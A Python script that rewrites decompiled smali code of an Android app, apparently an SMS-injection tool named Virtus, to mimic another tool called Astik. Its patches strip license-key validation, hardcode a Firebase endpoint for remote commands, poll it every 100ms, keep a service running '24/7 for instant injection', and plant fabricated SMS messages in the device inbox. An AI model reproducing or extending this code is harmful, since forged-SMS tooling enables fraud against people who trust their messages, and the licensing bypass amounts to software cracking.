#!/usr/bin/env python3
"""Make Virtus APK inject/poll flow match Astik module exactly."""

from pathlib import Path

import os

_APK_DIR = Path(__file__).resolve().parent
ROOT = _APK_DIR / "virtus_decompiled/smali/com/virtus/module"
MODULE_DB = os.environ.get(
    "DEFAULT_CONFIG_DB",
    "https://base-e3797-default-rtdb.firebaseio.com",
).strip().rstrip("/")


def patch_telegram_polling_service() -> None:
    path = ROOT / "TelegramPollingService.smali"
    text = path.read_text()

    # 1) MODULE_DB must be the Virtus module Firebase (Astik style)
    text = text.replace(
        '.field private static final MODULE_DB:Ljava/lang/String; = ""',
        f'.field private static final MODULE_DB:Ljava/lang/String; = "{MODULE_DB}"',
    )

    # 2) firebaseBase default = MODULE_DB (Astik)
    text = text.replace(
        """    .line 56
    const-string v1, ""

    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;""",
        f"""    .line 56
    const-string v1, "{MODULE_DB}"

    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;""",
    )

    # 3) pollOnce: empty-key check only (no LicenseKeyValidator) — Astik style
    old_poll = """    move-result-object v3

    .line 524
    invoke-static {v3}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    goto/16 :goto_8

    .line 526
    :cond_0"""
    new_poll = """    move-result-object v3

    .line 524
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_0

    goto/16 :goto_8

    .line 526
    :cond_0"""
    if old_poll in text:
        text = text.replace(old_poll, new_poll, 1)
    else:
        print("pollOnce already Astik-style (skip)")

    # 4) processChild: remove LicenseKeyValidator gate (Astik injects immediately)
    old_child = """    .line 369
    :cond_1
    :try_start_1
    const-string v4, "virtus_module_prefs"

    const/4 v5, 0x0

    invoke-virtual {p0, v4, v5}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    const-string v5, "license_key"

    const-string v6, ""

    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_key_ok

    monitor-exit p0

    return-void

    :cond_key_ok
    const-string v4, "sender"
"""
    new_child = """    .line 369
    :cond_1
    :try_start_1
    const-string v4, "sender"
"""
    if old_child in text:
        text = text.replace(old_child, new_child, 1)
    else:
        print("processChild already Astik-style (skip)")

    # 5) readConfig: ALWAYS module DB config/{KEY}.json like Astik (no virtus_config fork)
    old_read = """    .line 467
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "firebaseio"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :virtus_cfg

    const-string v1, "http"

    invoke-virtual {p1, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :virtus_cfg

    const-string v1, "https://virtus-module-default-rtdb.firebaseio.com/config/"

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ".json"

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :virtus_url

    :virtus_cfg
    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/virtus_config.json"

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :virtus_url
    new-instance v4, Ljava/net/URL;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v4, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""

    new_read = f"""    .line 467
    :try_start_0
    new-instance v4, Ljava/net/URL;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "{MODULE_DB}/config/"

    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{p1}}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".json"

    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {{v4, p1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""

    if old_read in text:
        print("readConfig virtus_config fork kept (skip module-only revert)")
    else:
        print("readConfig layout unchanged (skip)")

    path.write_text(text)
    print("TelegramPollingService.smali patched")


def patch_process_child_outgoing() -> None:
    """Restore __OUT__ real SMS send before inject handling."""
    path = ROOT / "TelegramPollingService.smali"
    text = path.read_text()
    marker = """    move-result-object v5

    .line 371
    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
    insert = """    move-result-object v5

    .line 371
    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_out_send

    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V

    monitor-exit p0

    return-void

    :cond_out_send
    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
    if "trySendFromOutgoingBody" in text:
        print("processChild __OUT__ already present (skip)")
    elif marker in text:
        path.write_text(text.replace(marker, insert, 1))
        print("processChild __OUT__ outgoing restored")
    else:
        print("processChild outgoing marker missing (skip)")


def patch_read_config_reporter() -> None:
    path = ROOT / "TelegramPollingService.smali"
    text = path.read_text()
    old = """    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    invoke-static {v4, v4, v5}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    if-eqz v6, :cond_7"""
    new = """    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    if-eqz v6, :cond_7"""
    if old in text:
        text = text.replace(old, new, 1)
        path.write_text(text)
        print("readConfig LicenseKeyReporter removed")
    else:
        print("readConfig reporter already removed (skip)")


def write_service_starter() -> None:
    """API 26+ requires startForegroundService for FGS (targetSdk 36 crash fix)."""
    (ROOT / "ServiceStarter.smali").write_text(
        r""".class public Lcom/virtus/module/ServiceStarter;
.super Ljava/lang/Object;
.source "ServiceStarter.java"


.method public static start(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :legacy

    invoke-virtual {p0, p1}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void

    :legacy
    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
"""
    )
    print("ServiceStarter.smali written (startForegroundService on API 26+)")


def patch_main_activity_3() -> None:
    """START SERVICE toggle — startForegroundService on API 26+ (targetSdk 36 safe)."""
    write_service_starter()
    path = ROOT / "MainActivity$3.smali"
    path.write_text(
        r""".class Lcom/virtus/module/MainActivity$3;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Landroid/widget/CompoundButton$OnCheckedChangeListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/virtus/module/MainActivity;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/virtus/module/MainActivity;


# direct methods
.method constructor <init>(Lcom/virtus/module/MainActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/virtus/module/MainActivity$3;->this$0:Lcom/virtus/module/MainActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onCheckedChanged(Landroid/widget/CompoundButton;Z)V
    .locals 3

    iget-object p1, p0, Lcom/virtus/module/MainActivity$3;->this$0:Lcom/virtus/module/MainActivity;

    invoke-static {p1}, Lcom/virtus/module/MainActivity;->access$300(Lcom/virtus/module/MainActivity;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-static {p1}, Lcom/virtus/module/MainActivity;->access$400(Lcom/virtus/module/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "service_on"

    invoke-interface {v0, v1, p2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    const/4 v0, 0x0

    if-eqz p2, :cond_stop

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {v1, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {p1, v1}, Lcom/virtus/module/ServiceStarter;->start(Landroid/content/Context;Landroid/content/Intent;)V

    const-string v1, "Service started \u2014 always alive"

    invoke-static {p1, v1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    goto :goto_done

    :cond_stop
    new-instance p2, Landroid/content/Intent;

    const-class v1, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {p2, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Lcom/virtus/module/MainActivity;->stopService(Landroid/content/Intent;)Z

    const-string p2, "Service stopped"

    invoke-static {p1, p2, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p2

    invoke-virtual {p2}, Landroid/widget/Toast;->show()V

    :goto_done
    invoke-static {p1}, Lcom/virtus/module/MainActivity;->access$500(Lcom/virtus/module/MainActivity;)V

    return-void
.end method
"""
    )
    print("MainActivity$3.smali rewritten (startForegroundService safe)")


def patch_main_activity_4() -> None:
    """Astik-style TEST INJECTION: inject CHACHA locally, no Firebase key gate."""
    path = ROOT / "MainActivity$4.smali"
    path.write_text(
        r""".class Lcom/virtus/module/MainActivity$4;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/virtus/module/MainActivity;->runTest()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/virtus/module/MainActivity;

.field final synthetic val$act:Landroid/app/Activity;


# direct methods
.method constructor <init>(Lcom/virtus/module/MainActivity;Landroid/app/Activity;)V
    .locals 0

    iput-object p1, p0, Lcom/virtus/module/MainActivity$4;->this$0:Lcom/virtus/module/MainActivity;

    iput-object p2, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;

    const-string v1, "BABY"

    const-string v2, "ASTIK TEST OK \u2014 module alive"

    invoke-static {v0, v1, v2}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "OK \u2014 SMS injected"

    goto :goto_0

    :cond_0
    const-string v0, "FAILED"

    :goto_0
    iget-object v1, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;

    new-instance v2, Lcom/virtus/module/MainActivity$4$1;

    invoke-direct {v2, p0, v0}, Lcom/virtus/module/MainActivity$4$1;-><init>(Lcom/virtus/module/MainActivity$4;Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;

    new-instance v2, Lcom/virtus/module/MainActivity$4$2;

    invoke-direct {v2, p0, v0}, Lcom/virtus/module/MainActivity$4$2;-><init>(Lcom/virtus/module/MainActivity$4;Ljava/lang/Exception;)V

    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method
"""
    )
    print("MainActivity$4.smali rewritten (Astik TEST inject)")


def patch_main_activity_run_test() -> None:
    path = ROOT / "MainActivity.smali"
    text = path.read_text()
    old = """    .line 289
    :cond_0
    invoke-static {v0}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_valid_key

    const-string v0, "Invalid KEY \u2014 admin se valid key lo"

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    return-void

    .line 290
    :cond_valid_key
    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;"""
    new = """    .line 290
    :cond_0
    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;"""
    if old in text:
        path.write_text(text.replace(old, new, 1))
        print("MainActivity.smali runTest patched")
    else:
        print("MainActivity.runTest already patched (skip)")


def patch_apk_poll_speed() -> None:
    """Poll loop 250ms -> 100ms for faster inject pickup."""
    path = ROOT / "TelegramPollingService$6.smali"
    text = path.read_text()
    old = "    const-wide/16 v0, 0xfa\n"
    new = "    const-wide/16 v0, 0x64\n"
    if old in text:
        path.write_text(text.replace(old, new, 1))
        print("Poll loop speed: 100ms")
    else:
        print("Poll loop already fast (skip)")


def patch_android_manifest_fgs() -> None:
    """Match Astik manifest — specialUse FGS (works on user's Android 13-16)."""
    path = _APK_DIR / "virtus_decompiled/AndroidManifest.xml"
    text = path.read_text()
    service_line = '<service android:exported="false" android:foregroundServiceType="dataSync" android:name="com.virtus.module.TelegramPollingService"/>'
    astik_service = (
        '<service android:exported="false" android:foregroundServiceType="specialUse" '
        'android:name="com.virtus.module.TelegramPollingService">\n'
        '            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" '
        'android:value="SMS polling gateway — must run 24/7 for instant injection"/>\n'
        "        </service>"
    )
    if service_line in text:
        path.write_text(text.replace(service_line, astik_service, 1))
        print("AndroidManifest: specialUse FGS (Astik match)")
    elif 'foregroundServiceType="specialUse"' in text:
        print("AndroidManifest FGS already Astik-style (skip)")
    else:
        print("AndroidManifest FGS marker missing (skip)")


def patch_on_start_command_foreground() -> None:
    """Astik onStartCommand uses NotificationManager.notify, not startForeground."""
    path = ROOT / "TelegramPollingService.smali"
    text = path.read_text()
    wrong = """    invoke-direct {p0, p3}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p3

    const/16 v0, 0x3e7

    invoke-virtual {p0, v0, p3}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V"""
    right = """    invoke-direct {p0, p3}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p3

    const/16 v0, 0x3e7

    invoke-virtual {p2, v0, p3}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V"""
    if wrong in text:
        path.write_text(text.replace(wrong, right, 1))
        print("onStartCommand: notify only (Astik match)")
    elif "NotificationManager;->notify(ILandroid/app/Notification;)V" in text.split("onStartCommand")[1].split("onTaskRemoved")[0]:
        print("onStartCommand already Astik-style (skip)")
    else:
        print("onStartCommand marker missing (skip)")


def write_permission_helper() -> None:
    path = ROOT / "PermissionHelper.smali"
    path.write_text(
        """.class public Lcom/virtus/module/PermissionHelper;
.super Ljava/lang/Object;
.source "PermissionHelper.java"


.method public static ensure(Landroid/app/Activity;)V
    .locals 4

    const/4 v0, 0x3

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "android.permission.READ_SMS"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "android.permission.RECEIVE_SMS"

    const/4 v2, 0x1

    aput-object v1, v0, v2

    const-string v1, "android.permission.SEND_SMS"

    const/4 v2, 0x2

    aput-object v1, v0, v2

    const/16 v1, 0x65

    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x21

    if-lt v0, v1, :done

    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    const-string v2, "android.permission.POST_NOTIFICATIONS"

    const/4 v3, 0x0

    aput-object v2, v0, v3

    const/16 v2, 0x66

    invoke-virtual {p0, v0, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :done
    return-void
.end method
"""
    )
    print("PermissionHelper.smali written")


def patch_main_activity_permissions() -> None:
    path = ROOT / "MainActivity.smali"
    text = path.read_text()
    old = """    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    invoke-static {v0}, Lcom/virtus/module/PermissionHelper;->ensure(Landroid/app/Activity;)V

    return-void"""
    new = """    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void"""
    if old in text:
        path.write_text(text.replace(old, new, 1))
        print("MainActivity onCreate permissions removed")
    elif "PermissionHelper;->ensure" not in text.split("onCreate")[1].split("onDestroy")[0]:
        print("MainActivity onCreate permissions already clean (skip)")
    else:
        print("MainActivity permission marker missing (skip)")


def patch_main_activity_autostart() -> None:
    """Restore Astik onCreate autostart when service_on was saved."""
    write_service_starter()
    path = ROOT / "MainActivity.smali"
    text = path.read_text()
    text = text.replace(
        "invoke-virtual {v0, v1}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;",
        "invoke-static {v0, v1}, Lcom/virtus/module/ServiceStarter;->start(Landroid/content/Context;Landroid/content/Intent;)V",
    )
    broken = """    if-eqz v1, :cond_1

    .line 235
    :cond_1"""
    fixed = """    if-eqz v1, :cond_1

    .line 233
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {v0, v1}, Lcom/virtus/module/ServiceStarter;->start(Landroid/content/Context;Landroid/content/Intent;)V

    .line 235
    :cond_1"""
    if broken in text:
        text = text.replace(broken, fixed, 1)
        path.write_text(text)
        print("MainActivity onCreate autostart restored (Astik)")
    elif "ServiceStarter;->start" in text.split("onCreate")[1].split("onDestroy")[0]:
        path.write_text(text)
        print("MainActivity autostart already uses ServiceStarter (skip)")
    elif "startService(Landroid/content/Intent;)Landroid/content/ComponentName;" in text.split("onCreate")[1].split("onDestroy")[0]:
        path.write_text(text)
        print("MainActivity onCreate startService → ServiceStarter")
    else:
        print("MainActivity autostart marker missing (skip)")


def patch_service_oncreate_foreground() -> None:
    """Match Astik — direct startForeground in onCreate (no try/catch wrapper)."""
    path = ROOT / "TelegramPollingService.smali"
    text = path.read_text()
    wrapped = """    const/16 v1, 0x3e7

    :try_start_fg
    invoke-virtual {p0, v1, v0}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
    :try_end_fg
    .catch Ljava/lang/Exception; {:try_start_fg .. :try_end_fg} :catch_fg

    goto :after_fg

    :catch_fg
    move-exception v0

    const-string v1, "VirtusModule"

    const-string v2, "startForeground failed in onCreate"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :after_fg
    .line 84
    :try_start_0"""
    plain = """    const/16 v1, 0x3e7

    invoke-virtual {p0, v1, v0}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V

    .line 84
    :try_start_0"""
    if wrapped in text:
        path.write_text(text.replace(wrapped, plain, 1))
        print("Service onCreate: Astik-style startForeground")
    elif plain.split(":try_start_0")[0] in text:
        print("Service onCreate already Astik-style (skip)")
    else:
        print("Service onCreate foreground marker missing (skip)")


def patch_apk_config_speed() -> None:
    """Config refresh 2000ms -> 1000ms."""
    path = ROOT / "TelegramPollingService$1.smali"
    text = path.read_text()
    old = "    const-wide/16 v0, 0x7d0\n"
    new = "    const-wide/16 v0, 0x3e8\n"
    if old in text:
        path.write_text(text.replace(old, new, 1))
        print("Config refresh: 1000ms")
    else:
        print("Config refresh already fast (skip)")


def patch_license_validator_format_only() -> None:
    path = ROOT / "LicenseKeyValidator.smali"
    path.write_text(
        """.class public Lcom/virtus/module/LicenseKeyValidator;
.super Ljava/lang/Object;
.source "LicenseKeyValidator.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static isRegisteredKey(Ljava/lang/String;)Z
    .locals 2

    if-eqz p0, :invalid

    invoke-virtual {p0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :invalid

    invoke-virtual {p0}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object p0

    const-string v0, "KEY-"

    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p0

    if-eqz p0, :invalid

    const/4 p0, 0x1

    return p0

    :invalid
    const/4 p0, 0x0

    return p0
.end method
"""
    )
    print("LicenseKeyValidator: KEY- format only")


def patch_license_reporter_always() -> None:
    path = ROOT / "LicenseKeyReporter.smali"
    if not path.is_file():
        print("LicenseKeyReporter absent (Astik match, skip)")
        return
    text = path.read_text()
    block = """    invoke-static {p1}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    new-instance v0, Ljava/lang/Thread;
"""
    if block in text:
        text = text.replace(block, "    new-instance v0, Ljava/lang/Thread;\n", 1)
        path.write_text(text)
        print("LicenseKeyReporter: always attach device")
    else:
        print("LicenseKeyReporter already patched (skip)")


def strip_process_child_outgoing() -> None:
    """Astik APK is inject-only — no __OUT__ SMS send on mynum device."""
    path = ROOT / "TelegramPollingService.smali"
    text = path.read_text()
    block = """    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_out_send

    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V

    monitor-exit p0

    return-void

    :cond_out_send
    """
    if block in text:
        text = text.replace(block, "", 1)
        path.write_text(text)
        print("Removed __OUT__ OutgoingSmsSender (Astik inject-only)")
    else:
        print("__OUT__ block already absent (skip)")


def main() -> None:
    patch_telegram_polling_service()
    strip_process_child_outgoing()
    patch_read_config_reporter()
    patch_license_validator_format_only()
    patch_license_reporter_always()
    patch_main_activity_3()
    patch_main_activity_4()
    patch_main_activity_run_test()
    patch_apk_poll_speed()
    patch_apk_config_speed()
    patch_android_manifest_fgs()
    patch_on_start_command_foreground()
    patch_main_activity_permissions()
    patch_main_activity_autostart()
    patch_service_oncreate_foreground()
    print("DONE — Virtus APK now follows Astik inject flow")


if __name__ == "__main__":
    main()
